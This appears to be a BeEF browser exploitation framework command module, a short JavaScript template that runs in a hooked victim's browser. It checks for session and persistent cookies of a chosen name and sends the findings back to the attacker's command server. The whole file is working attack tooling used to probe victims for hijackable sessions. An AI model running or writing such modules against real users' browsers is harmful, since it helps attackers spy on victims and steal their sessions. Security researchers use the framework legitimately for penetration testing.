beef.execute(function() {

	var sessionResult = beef.browser.cookie.hasSessionCookies("<%= @cookie %>");
	var persistentResult = beef.browser.cookie.hasPersistentCookies("<%= @cookie %>");

    var results = {'has_session_cookies': sessionResult, 'has_persistent_cookies':persistentResult, 'cookie':'<%= @cookie %>'}
	beef.net.send("<%= @command_url %>", <%= @command_id %>, results);
});

